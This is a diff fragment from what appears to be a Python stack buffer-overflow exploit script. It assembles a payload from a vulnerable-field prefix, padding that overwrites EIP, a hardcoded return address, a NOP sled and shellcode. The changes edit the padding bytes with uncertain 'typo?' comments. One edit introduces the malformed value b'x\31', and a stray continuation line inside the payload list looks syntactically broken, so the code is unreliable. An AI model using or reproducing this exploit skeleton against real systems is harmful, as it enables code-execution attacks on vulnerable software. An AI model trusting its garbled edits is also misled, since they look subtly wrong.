@@ -204,15 +204,20 @@ EIP_LOCATION = FULL_EIP_OVERWRITE - len(EIP)
 # BLANK[] x_As HERE
 ## obfuscate A's for anti-memory-forensics
 
-# x_As=b"\41"*EIP_LOCATION
+#typo?
+## x_As=b"\41"*EIP_LOCATION
+# x_As=b"\x41"*EIP_LOCATION
 
 # ---------  USE x86/asm_obf IF USED! --------- #
-x_As=b"\31"*EIP_LOCATION
+#typo?
+##x_As=b"\31"*EIP_LOCATION
+x_As=b"x\31"*EIP_LOCATION
 # ---------  USE x86/asm_obf IF USED! --------- #
 
 
 load = [ vf,    ## ------| vf         - vulnerable field
-         x_As,  ## ------| x_As       - b"\41" * EIP_LOCATION
+         x_As,  ## ------| x_As       - ##typo?  #b"\41" * EIP_LOCATION 
+                                          --  #   b"\X41" * EIP_LOCATION
          EIP,   ## ------| EIP        - b"\xaf\x11\x50\x62"
          nops,  ## ------| NOP_RAMP   - nop*num_of_nops
          sh2    ## ------| sh         - shellcode 
